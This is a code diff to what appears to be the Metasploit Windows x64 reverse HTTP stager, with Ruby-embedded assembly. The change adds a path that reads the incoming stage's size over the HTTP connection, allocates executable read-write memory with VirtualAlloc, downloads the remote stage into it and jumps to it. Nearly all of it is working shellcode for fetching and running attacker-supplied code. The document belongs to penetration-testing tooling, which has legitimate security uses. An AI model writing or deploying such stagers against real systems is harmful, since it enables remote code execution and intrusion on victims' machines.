@@ -441,6 +441,58 @@ module Payload::Windows::ReverseHttp_x64
       ^
     end
 
+    # our other recent stagers like reverse_tcp read in the size of the incoming
+    # stage.  We don't know why the http stager still just allocs 4MB and yeets
+    # the stage into it, but we should be allocating what we need, not what we guess we need
+    # these changes are to support the custom payload type, but in the future, we should
+    # change the reverse_http stagers to read in the size and allocate what it needs.
+    # as a breaking change, it will need to wait for the next major release.
+    #
+    if defined?(read_stage_size?) && read_stage_size?
+      asm << %Q^
+      allocate_memory:
+        ; read incoming stage size
+        push rbx                      ; buffer for stage size
+        mov rdx, rsp                  ; lpBuffer (pointer to mem)
+        push rbx                      ; buffer for bytesRead
+        mov r9, rsp                   ; lpdwNumberOfBytesRead (stack pointer)
+        push 4
+        pop r8                        ; dwNumberOfBytesToRead (4 bytes)
+        mov rcx, rsi                  ; hFile (request handle)
+        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetReadFile')}
+        call rbp
+        test eax, eax                 ; did the download fail?
+        jz failure
+        add rsp, 40                   ; remove 32 bytes of home space and 8 bytes of bytesRead
+        ; allocate memory for stage
+        push rbx
+        pop rcx                       ; lpAddress (NULL)
+        pop rdx                       ; incoming stage size (Used in InternetReadFile)
+        mov rbx, rdx                  ; save off stage size (rdx is volatile)
+        push 0x40
+        pop r9                        ; flProtect (0x40=PAGE_EXECUTE_READWRITE)
+        mov r8, 0x1000                ; flAllocationType (0x1000=MEM_COMMIT)
+        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+        call rbp
+        ;download stage
+      download_prep:
+        xchg rax, rbx                 ; store the allocated base in rbx
+        push rbx                      ; store allocated memory address for later ret
+        push rbx                      ; temp storage for byte count
+        mov rdi, rsp                  ; rdi is the &bytesRead
+        mov rcx, rsi                  ; hFile (request handle)
+        mov r8, rax                   ; dwNumberOfBytesToRead (incoming stage size)
+        mov rdx, rbx                  ; lpBuffer (pointer to mem)
+        mov r9, rdi                   ; lpdwNumberOfByteRead (stack pointer)
+        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetReadFile')}
+        call rbp
+        add rsp, 32                   ; clean up reserved space
+        test eax, eax                 ; did the download fail?
+        jz failure
+        pop rax                       ; clear up reserved space
+    ^
+
+    else
     asm << %Q^
       allocate_memory:
         push rbx
@@ -478,6 +530,10 @@ module Payload::Windows::ReverseHttp_x64
         jnz download_more             ; keep going
         pop rax                       ; clear up reserved space
 
+    ^
+    end
+
+    asm << %Q^
       execute_stage:
         ret                           ; return to the stored stage address
     ^
